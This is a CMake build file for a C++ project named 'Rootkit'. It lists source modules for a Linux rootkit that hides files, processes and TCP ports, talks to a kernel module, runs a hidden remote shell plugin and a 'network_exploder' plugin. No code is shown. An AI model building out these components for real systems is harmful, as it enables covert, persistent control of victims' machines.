cmake_minimum_required(VERSION 3.18)
project(Rootkit)

set(CMAKE_CXX_STANDARD 20)

set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -pthread")
add_executable(Rootkit

        ../basic/basic_rootkit.h
        ../basic/basic_rootkit.cpp

        ../basic/basic_plugin.h

        ../basic/mex_generator.h
        ../basic/mex_generator.cpp

        ../basic/network/basic_client_handler.h
        ../basic/network/basic_connection_establisher.h
        ../basic/network/basic_listener.h
        ../basic/network/tcp_port.h

#        linux file system access
        file_system_access/file_system_access.h
        file_system_access/file_system_access.cpp

#        linux network access
        network_access/network_access.cpp
        network_access/network_access.h

        network_access/linux_client_handler.cpp
        network_access/linux_client_handler.h
        network_access/linux_tcp_connection_establisher.cpp
        network_access/linux_tcp_connection_establisher.h

        network_access/dummy_tcp_port_listener.cpp
        network_access/dummy_tcp_port_listener.h

        # linux process access
        process_access/process_access.h
        process_access/process_access.cpp

        # linux cli shell access
        cli_shell_access/cli_shell_access.cpp
        cli_shell_access/cli_shell_access.h

        # files, process, and tcp ports hider
        hider/hider.cpp
        hider/hider.h

        # linux kernel level access
        kernel_access/kernel_access.cpp
        kernel_access/kernel_access.h
        kernel_access/operations_protocol.h
        kernel_access/msg_to_module.h
        kernel_access/msg_to_user.h

#       linux plugins
        plugins/hidden_remote_cli_shell/hidden_remote_cli_shell.cpp
        plugins/hidden_remote_cli_shell/hidden_remote_cli_shell.h
        plugins/hidden_remote_cli_shell/cli_shell_listener.cpp
        plugins/hidden_remote_cli_shell/cli_shell_listener.h

        plugins/network_exploder/network_exploder.cpp
        plugins/network_exploder/network_exploder.h

#       linux rootkit
        linux_rootkit.cpp
        linux_rootkit.h

#       linux rootkit controllers
        main.cpp # contains main function
        main.h


)
